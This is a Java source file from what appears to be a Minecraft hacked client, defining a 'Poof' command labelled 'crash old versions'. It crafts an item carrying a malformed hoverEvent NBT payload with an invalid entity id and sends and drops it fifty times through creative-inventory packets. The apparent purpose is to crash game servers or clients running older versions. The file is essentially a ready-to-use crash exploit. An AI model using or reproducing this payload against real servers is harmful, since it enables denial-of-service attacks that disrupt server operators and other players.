/*
 * Copyright (c) Shadow client, 0x150, Saturn5VFive 2022. All rights reserved.
 */

package net.shadow.client.feature.command.impl;

import com.mojang.brigadier.exceptions.CommandSyntaxException;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.shadow.client.ShadowMain;
import net.shadow.client.feature.command.Command;

import java.util.Objects;

public class Poof extends Command {
    public Poof() {
        super("Poof", "crash old versions", "poof");
    }

    public static void drop(int slot) {
        ShadowMain.client.interactionManager.clickSlot(ShadowMain.client.player.currentScreenHandler.syncId, slot, 1, SlotActionType.THROW, ShadowMain.client.player);
    }

    @Override
    public String[] getSuggestions(String fullCommand, String[] args) {
        if (args.length == 1) {
            return Objects.requireNonNull(ShadowMain.client.world).getPlayers().stream().map(abstractClientPlayerEntity -> abstractClientPlayerEntity.getGameProfile().getName()).toList().toArray(String[]::new);
        }
        return super.getSuggestions(fullCommand, args);
    }

    @Override
    public void onExecute(String[] args) {
        ItemStack crashme = new ItemStack(Items.IRON_HOE, 1);
        try {
            crashme.setNbt(StringNbtReader.parse("{display:{Name:'{\"text\":\"fuck\",\"hoverEvent\":{\"action\":\"show_entity\",\"contents\":{\"id\":\"ez\",\"type\":\"minecraft:player\"}}}'}}"));
        } catch (CommandSyntaxException e) {
            e.printStackTrace();
        }
        for (int i = 0; i < 50; i++) {
            ShadowMain.client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(9, crashme));
            drop(9);
        }
    }
}